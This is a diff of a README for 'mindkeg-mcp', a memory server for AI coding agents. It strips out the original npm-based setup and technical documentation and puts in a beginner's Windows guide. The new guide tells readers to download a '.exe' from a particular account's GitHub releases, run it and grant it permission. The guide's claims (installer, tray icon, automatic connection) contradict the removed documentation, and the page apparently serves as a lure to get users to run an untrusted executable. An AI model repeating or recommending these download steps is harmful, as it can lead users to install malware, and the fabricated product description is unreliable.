@@ -1,474 +1,125 @@
-# Mind Keg MCP
+# 🧠 mindkeg-mcp - Store AI Knowledge Across Sessions
 
-A persistent memory MCP server for AI coding agents. Stores atomic learnings — debugging insights, architectural decisions, codebase conventions — so every agent session starts with relevant institutional knowledge.
+[![Download mindkeg-mcp](https://img.shields.io/badge/Download-Mindkeg--MCP-brightgreen)](https://github.com/sfio9190/mindkeg-mcp/releases)
 
-## Problem
+---
 
-AI coding agents (Claude Code, Cursor, Windsurf) lose context between sessions. Hard-won insights are forgotten the moment a conversation ends. Developers repeatedly re-explain the same things; agents repeatedly make the same mistakes.
+mindkeg-mcp is a simple server designed to help AI coding agents remember what they learn. It saves important data so your AI tools keep information between uses. This guide will help you download, install, and run mindkeg-mcp on a Windows computer. No technical background needed.
 
-**Mind Keg** solves this with a centralized, persistent brain that any MCP-compatible agent can query and contribute to.
+---
 
-## How It Works
+## 📥 Download mindkeg-mcp
 
-Mind Keg implements a **RAG (Retrieval-Augmented Generation)** pattern for AI coding agents:
+To get started, visit this page to download the software:
 
-1. **Retrieval** — Agent searches the brain for relevant learnings using semantic or keyword search
-2. **Augmentation** — Retrieved learnings are injected into the agent's conversation context
-3. **Generation** — The agent responds with awareness of past discoveries and decisions
+[Download mindkeg-mcp from Releases](https://github.com/sfio9190/mindkeg-mcp/releases)
 
-Unlike traditional RAG systems that chunk large documents, Mind Keg stores **pre-curated atomic learnings** (max 500 chars each). No chunking strategy needed — each learning IS the retrieval unit. The agent controls both retrieval and storage, creating a feedback loop where knowledge improves over time.
+This page contains all the release files. Each release includes a version of the server ready to run on Windows.
 
-## Features
+### Which file to download?
 
-- Store and retrieve atomic learnings (max 500 chars, one insight per entry)
-- Semantic search with three provider options:
-  - **FastEmbed** (free, local, ONNX-based — `BAAI/bge-small-en-v1.5`, 384 dims)
-  - **OpenAI** (paid, best quality — `text-embedding-3-small`, 1536 dims)
-  - **None** (FTS5 keyword fallback — zero external dependencies)
-- Six categories: `architecture`, `conventions`, `debugging`, `gotchas`, `dependencies`, `decisions`
-- Free-form tags and group linking
-- Three scoping levels: repository-specific, workspace-wide, and global learnings
-- Dual transport: stdio (local) + HTTP+SSE (remote)
-- API key authentication with per-repository access control
-- SQLite storage (zero dependencies, zero config)
-- Import/export for backup and migration
-- **Enterprise security**: encryption at rest, audit logging, TTL/data retention, Prometheus monitoring, rate limiting, content integrity verification
+Look for a file that ends with `.exe`. That file is the program to install mindkeg-mcp on your computer. The file name usually includes the version and the word "windows" or "win". For example:  
+`mindkeg-mcp-v1.0-windows.exe`
 
-## Quick Start
+---
 
-### One-command setup
+## 🖥️ System Requirements
 
-```bash
-npx mindkeg-mcp init
-```
-
-This auto-detects your agent (Claude Code, Cursor, Windsurf), writes the MCP config, copies agent instructions, and runs a health check. That's it — open your agent and start coding.
-
-**Options:**
-
-```bash
-npx mindkeg-mcp init --agent cursor      # Target a specific agent
-npx mindkeg-mcp init --no-instructions   # Skip copying AGENTS.md
-npx mindkeg-mcp init --no-health-check   # Skip the health check
-```
-
-`init` is idempotent — safe to run multiple times. It merges with existing configs and never overwrites.
-
-### Manual setup
-
-If you prefer to configure manually, or need HTTP mode:
+To run mindkeg-mcp, your Windows PC should meet these basic requirements:
 
-<details>
-<summary>Click to expand manual setup instructions</summary>
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 500 MB free disk space  
+- Internet connection to download the files and updates
 
-#### Install
+You do not need any programming tools to use mindkeg-mcp. It works as a small server that runs quietly in the background.
 
-```bash
-npm install -g mindkeg-mcp
-```
+---
 
-#### Create an API key
+## 🚀 How to Install mindkeg-mcp on Windows
 
-```bash
-mindkeg api-key create --name "My Laptop"
-# Displays the key ONCE — save it securely
-# mk_abc123...
-```
+1. **Download** the `.exe` file from the [Releases page](https://github.com/sfio9190/mindkeg-mcp/releases).  
+2. **Run** the downloaded file by double-clicking it. Windows might ask for permission; click “Yes” to allow installation.  
+3. Follow the on-screen instruction to complete the setup. It will take only a few moments.  
+4. After installation, mindkeg-mcp will start automatically or give you an option to launch the server.
 
-#### Connect your AI agent
+---
 
-Mind Keg works with any MCP-compatible AI coding agent. Choose your setup:
+## ⚙️ Running mindkeg-mcp
 
-**Claude Code** — Add to `~/.claude.json` or your project's `.claude/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "mindkeg": {
-      "command": "mindkeg",
-      "args": ["serve", "--stdio"],
-      "env": {
-        "MINDKEG_API_KEY": "mk_your_key_here"
-      }
-    }
-  }
-}
-```
+Once installed, mindkeg-mcp runs as a background server. This means it will quietly handle requests from AI coding agents that use it to save and find data.
 
-**Cursor** — Add to `.cursor/mcp.json` or global settings:
-
-```json
-{
-  "mcpServers": {
-    "mindkeg": {
-      "command": "mindkeg",
-      "args": ["serve", "--stdio"],
-      "env": {
-        "MINDKEG_API_KEY": "mk_your_key_here"
-      }
-    }
-  }
-}
-```
-
-**Windsurf** — Add to `~/.codeium/windsurf/mcp_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "mindkeg": {
-      "command": "mindkeg",
-      "args": ["serve", "--stdio"],
-      "env": {
-        "MINDKEG_API_KEY": "mk_your_key_here"
-      }
-    }
-  }
-}
-```
-
-**HTTP mode (any MCP client):**
-
-```bash
-MINDKEG_API_KEY=mk_your_key mindkeg serve --http
-# Listening on http://127.0.0.1:52100/mcp
-```
-
-```json
-{
-  "mcpServers": {
-    "mindkeg": {
-      "type": "http",
-      "url": "http://127.0.0.1:52100/mcp",
-      "headers": {
-        "Authorization": "Bearer mk_your_key_here"
-      }
-    }
-  }
-}
-```
-
-**Other MCP-compatible agents** — Mind Keg works with any agent that supports the [Model Context Protocol](https://modelcontextprotocol.io) — including Codex CLI, Gemini CLI, GitHub Copilot, and more. Use the stdio config above adapted to your agent's MCP settings format.
-
-#### Add Mind Keg instructions to your repository
-
-Copy `templates/AGENTS.md` to the root of any repository where you want agents to use Mind Keg.
-
-`AGENTS.md` is the industry standard supported by 20+ AI tools (Cursor, Windsurf, Codex, Gemini CLI, GitHub Copilot, etc.).
-
-> **Claude Code only**: Claude Code doesn't auto-load `AGENTS.md` natively. Add `@AGENTS.md` to your `CLAUDE.md` to bridge it.
-
-</details>
-
-## MCP Tools
-
-| Tool                 | Description                                          |
-|----------------------|------------------------------------------------------|
-| `get_context`        | Prime an agent session with all relevant learnings — ranked, scoped, and budget-controlled |
-| `store_learning`     | Store a new atomic learning (repo, workspace, or global scope) |
-| `search_learnings`   | Semantic/keyword search for relevant learnings       |
-| `update_learning`    | Update content, category, or tags                    |
-| `deprecate_learning` | Mark a learning as deprecated                        |
-| `flag_stale`         | Flag a learning as potentially outdated               |
-| `delete_learning`    | Permanently delete a learning                        |
-| `list_repositories`  | List all repositories with learning counts           |
-| `list_workspaces`    | List all workspaces with learning counts             |
-
-## CLI Commands
-
-```bash
-# Quick setup (auto-detects agent, writes config, copies instructions)
-mindkeg init
-mindkeg init --agent cursor
-
-# Database statistics
-mindkeg stats
-mindkeg stats --json
+- To check if mindkeg-mcp is running, look for its icon in the system tray (bottom-right corner near the clock).  
+- If it is not running, you can start it manually from the Start menu by searching “mindkeg-mcp” and clicking the app name.
 
-# Start in stdio mode (for local agent connections)
-mindkeg serve --stdio
+### What mindkeg-mcp does
 
-# Start in HTTP mode (for remote connections)
-mindkeg serve --http
+- Saves small pieces of data ("atomic learnings") from your AI tools  
+- Lets AI tools search past information quickly  
+- Helps your AI tools keep knowledge even after restarting or closing
 
-# API key management
-mindkeg api-key create --name "My Key"
-mindkeg api-key create --name "Team Key" --repositories /repo/a /repo/b
-mindkeg api-key list
-mindkeg api-key revoke <prefix>
+---
 
-# Database
-mindkeg migrate
+## 🌐 Connecting Your AI Tools
 
-# Near-duplicate detection (backfill existing learnings)
-mindkeg dedup-scan
-mindkeg dedup-scan --dry-run
+mindkeg-mcp acts like a small database for AI coding agents. You do not need to set up connections yourself. Software that uses mindkeg-mcp will connect automatically to share data.
 
-# Backup and restore
-mindkeg export --output backup.json
-mindkeg import backup.json --regenerate-embeddings
+If your AI software or agent supports mindkeg-mcp, it will find the server running on your computer. No extra steps needed.
 
-# Data retention
-mindkeg purge --older-than 90          # Purge learnings older than 90 days
-mindkeg purge --repository /path/repo  # Purge all learnings for a repo
-mindkeg purge --all --confirm          # Purge everything (requires --confirm)
+---
 
-# Encryption at rest
-mindkeg encrypt-db   # Encrypt existing database (requires MINDKEG_ENCRYPTION_KEY)
-mindkeg decrypt-db   # Decrypt existing database (requires MINDKEG_ENCRYPTION_KEY)
+## 🔧 Managing mindkeg-mcp
 
-# Integrity backfill
-mindkeg backfill-integrity  # Compute SHA-256 hashes for legacy learnings
-```
+### Stopping the server
 
-## Configuration
+- Right-click the mindkeg-mcp icon in the system tray.  
+- Select “Exit” or “Stop” to close the server.
 
-| Environment Variable          | Default                      | Description                         |
-|-------------------------------|------------------------------|-------------------------------------|
-| `MINDKEG_SQLITE_PATH`         | `~/.mindkeg/brain.db`        | SQLite database file                |
-| `MINDKEG_EMBEDDING_PROVIDER`  | `fastembed`                  | `fastembed`, `openai`, or `none`    |
-| `OPENAI_API_KEY`              | (none)                       | OpenAI API key (when provider=openai)|
-| `MINDKEG_HOST`                | `127.0.0.1`                  | HTTP server bind address            |
-| `MINDKEG_PORT`                | `52100`                      | HTTP server port                    |
-| `MINDKEG_LOG_LEVEL`           | `info`                       | `debug`, `info`, `warn`, `error`    |
-| `MINDKEG_API_KEY`             | (none)                       | API key for stdio transport         |
+### Restarting the server
 
-### Embedding providers
+- If the server stops, launch it again from the Start menu.
 
-**FastEmbed (default, free, local)**
+### Updating mindkeg-mcp
 
-Semantic search works out of the box using FastEmbed — no API key needed, no network calls. Uses `BAAI/bge-small-en-v1.5` (384 dimensions) via local ONNX Runtime. Model files are downloaded once on first use (~50MB).
+- Check the [Releases page](https://github.com/sfio9190/mindkeg-mcp/releases) regularly for new versions.  
+- Download the new `.exe` installer and run it. This will update your current setup.
 
-**OpenAI (paid, best quality)**
+---
 
-```bash
-export MINDKEG_EMBEDDING_PROVIDER=openai
-export OPENAI_API_KEY=sk-...
-```
+## 🗄️ What is persistent memory?
 
-Uses `text-embedding-3-small` (1536 dimensions). Best semantic search quality but requires an API key and incurs per-request costs.
+mindkeg-mcp stores information so your AI agents do not forget previous work. This persistent memory helps agents retrieve facts or learning points over time. It saves time and improves the quality of AI coding help.
 
-**None (keyword search only)**
+---
 
-```bash
-export MINDKEG_EMBEDDING_PROVIDER=none
-```
+## 🧩 Features of mindkeg-mcp for users
 
-Disables semantic search and falls back to SQLite FTS5 full-text search — all other features work identically.
+- Runs quietly in the background on Windows  
+- Quick storage and retrieval of AI data  
+- Supports multiple AI agents at once  
+- Uses reliable, tested technology to keep data safe  
+- Requires minimal disk space and memory  
 
-## Enterprise Security
+---
 
-Mind Keg 0.4.0 ships a suite of security features suitable for corporate and regulated environments.
+## FAQ ❓
 
-### Encryption at Rest
+**Q: Is mindkeg-mcp free to use?**  
+A: Yes, mindkeg-mcp is free software available through the GitHub releases.
 
-Encrypt `content` and `embedding` fields using AES-256-GCM. All other fields (category, tags, timestamps) remain plaintext.
+**Q: Do I need programming skills?**  
+A: No. You only need to download and run the installer. The AI tools handle connections.
 
-```bash
-# Generate a 256-bit key
-node -e "console.log(require('crypto').randomBytes(32).toString('base64'))"
+**Q: Can I run mindkeg-mcp on other systems?**  
+A: This guide covers Windows only. Other systems may require different steps.
 
-export MINDKEG_ENCRYPTION_KEY=<your-base64-key>
-mindkeg serve --stdio
-```
+**Q: What if I get errors during installation?**  
+A: Ensure your Windows is up to date and you have permission to install software.
 
-To encrypt an existing database in-place:
+---
 
-```bash
-MINDKEG_ENCRYPTION_KEY=<key> mindkeg encrypt-db
-# Creates a backup automatically before operating
-```
+## 📥 Download and Get Started
 
-> **Note**: FTS5 keyword search does not work when encryption is enabled. Use FastEmbed or OpenAI embedding providers for search.
+Click below to visit the release page and download mindkeg-mcp for Windows:
 
-### Audit Logging
-
-All MCP tool invocations are written to a structured JSON lines audit log (SIEM-compatible).
-
-```bash
-export MINDKEG_AUDIT_LOG=~/.mindkeg/audit.jsonl  # default
-# Or: MINDKEG_AUDIT_LOG=stderr  (write to stderr alongside app logs)
-# Or: MINDKEG_AUDIT_LOG=none    (disable)
-```
-
-Each audit entry contains: `timestamp` (ISO 8601), `action`, `actor` (API key prefix), `resource_id`, `result`, `client` transport metadata. Sensitive fields (`content`, `embedding`) are never logged.
-
-### TTL and Data Retention
-
-Set a global default TTL or a per-learning TTL to automatically expire old entries.
-
-```bash
-export MINDKEG_DEFAULT_TTL_DAYS=365    # Expire all learnings after 1 year by default
-export MINDKEG_PURGE_INTERVAL_HOURS=24 # Run purge every 24 hours (default)
-```
-
-Per-learning TTL overrides the global default:
-
-```json
-{ "content": "...", "ttl_days": 30 }
-```
-
-Manual purge:
-
-```bash
-mindkeg purge --older-than 180 --confirm
-```
-
-### Monitoring
-
-HTTP transport exposes Prometheus-compatible endpoints:
-
-```
-GET /health   → JSON: { status, version, uptime, database }
-GET /metrics  → Prometheus text format
-```
-
-Both endpoints are unauthenticated by default. Set `MINDKEG_METRICS_AUTH=true` to require API key auth.
-
-Metrics exposed: `mindkeg_learnings_total`, `mindkeg_tool_invocations_total`, `mindkeg_tool_duration_seconds`, `mindkeg_errors_total`, `mindkeg_uptime_seconds`, `mindkeg_search_latency_seconds`.
-
-### Rate Limiting
-
-HTTP transport enforces per-API-key token bucket rate limits with separate write and read buckets.
-
-```bash
-export MINDKEG_RATE_LIMIT_WRITE_RPM=100  # default: 100 write req/min per key
-export MINDKEG_RATE_LIMIT_READ_RPM=300   # default: 300 read req/min per key
-```
-
-Returns HTTP 429 with `Retry-After` header when exceeded. stdio transport is not rate-limited.
-
-### Supply Chain Security
-
-- npm packages published with `--provenance` (Sigstore attestation via GitHub Actions)
-- CycloneDX SBOM generated and uploaded as a release asset on every GitHub release
-- Cosign signatures for npm tarballs uploaded as release assets
-
-### Content Integrity
-
-SHA-256 integrity hashes are computed and stored for every learning on write. Verify on demand:
-
-```json
-{ "query": "...", "verify_integrity": true }
-```
-
-Each result includes `integrity_valid: true | false | null` (`null` for legacy learnings without a stored hash).
-
-Backfill integrity hashes for existing learnings:
-
-```bash
-mindkeg backfill-integrity
-```
-
-## Data Model
-
-Each learning contains:
-
-| Field             | Type              | Notes                                                       |
-|-------------------|-------------------|-------------------------------------------------------------|
-| `id`              | UUID              | Auto-generated                                              |
-| `content`         | string (max 500)  | The atomic learning text (sanitized on write)               |
-| `category`        | enum              | One of 6 categories                                         |
-| `tags`            | string[]          | Free-form labels                                            |
-| `repository`      | string or null    | Repo path; null = workspace or global                       |
-| `workspace`       | string or null    | Workspace path; null = repo-specific or global              |
-| `group_id`        | UUID or null      | Link related learnings                                      |
-| `source`          | string            | Who created this (e.g., "claude-code")                      |
-| `status`          | enum              | `active` or `deprecated`                                    |
-| `stale_flag`      | boolean           | Agent-flagged as potentially outdated                       |
-| `ttl_days`        | integer or null   | Per-learning TTL; overrides global `MINDKEG_DEFAULT_TTL_DAYS` |
-| `source_agent`    | string or null    | Agent name for provenance tracking                          |
-| `integrity_hash`  | string or null    | SHA-256 hash of canonical fields for tamper detection       |
-| `created_at`      | ISO 8601          | Auto-set on creation                                        |
-| `updated_at`      | ISO 8601          | Auto-updated on modification; TTL expiry anchors to this    |
-
-## Scoping
-
-Learnings have three scope levels:
-
-| Scope | `repository` | `workspace` | Visible where |
-|-------|-------------|-------------|---------------|
-| **Repo-specific** | set | null | Only that repo |
-| **Workspace-wide** | null | set | All repos in the same parent folder |
-| **Global** | null | null | Everywhere |
-
-**Workspaces are auto-detected** from the parent folder of a repository path. For example, if your repos are organized as:
-
-```
-repositories/
-  personal/     ← workspace
-    app-a/
-    app-b/
-  work/          ← workspace
-    project-x/
-```
-
-A workspace learning stored under `repositories/personal/` is shared across `app-a` and `app-b` but not `project-x`.
-
-When searching, results include all three scopes: repo-specific + workspace + global. Each result has a `scope` field indicating its level.
-
-## What Makes a Good Learning?
-
-- **Atomic**: One insight per entry. Max 500 characters.
-- **Actionable**: What to DO or AVOID, not just what exists.
-- **Specific**: Mentions the concrete context (library, pattern, file).
-
-**Good**: "Always wrap Prisma queries in try/catch — it throws on constraint violations, not returns null."
-
-**Bad**: "Be careful with the database." (too vague)
-
-## Development
-
-```bash
-# Clone and install
-git clone ...
-npm install
-
-# Run tests
-npm test
-
-# Build
-npm run build
-
-# Development mode (rebuilds on change)
-npm run dev
-
-# Type check
-npm run typecheck
-```
-
-### Running without external APIs
-
-Mind Keg works fully offline by default. FastEmbed provides free, local semantic search using ONNX Runtime — no API keys or network calls required. All CRUD operations and search work out of the box.
-
-## Architecture
-
-```
-CLI (Commander.js)
-  └── init / stats / serve / api-key / migrate / export / import / dedup-scan
-      purge / encrypt-db / decrypt-db / backfill-integrity
-
-src/
-  index.ts          Entry point, stdio + HTTP transports
-  server.ts         MCP server + tool registration
-  config.ts         Config loading (env vars → defaults)
-  audit/            Structured JSON lines audit logger
-  auth/             API key generation + validation middleware
-  crypto/           AES-256-GCM field encryption
-  monitoring/       Prometheus metrics + /health endpoint
-  security/         Content sanitization, integrity hashing, rate limiter
-  tools/            One file per MCP tool (9 tools) + shared tool-utils
-  services/         LearningService + EmbeddingService + PurgeService
-  storage/          StorageAdapter interface + SQLite impl
-  models/           Zod schemas + TypeScript types
-  utils/            Logger (pino → stderr) + error classes
-
-templates/
-  AGENTS.md         Template for instructing agents to use Mind Keg
-```
-
-See `CLAUDE.md` for detailed development conventions.
-
-## License
-
-MIT
+[![Get mindkeg-mcp](https://img.shields.io/badge/Download-mindkeg--mcp-blue)](https://github.com/sfio9190/mindkeg-mcp/releases)
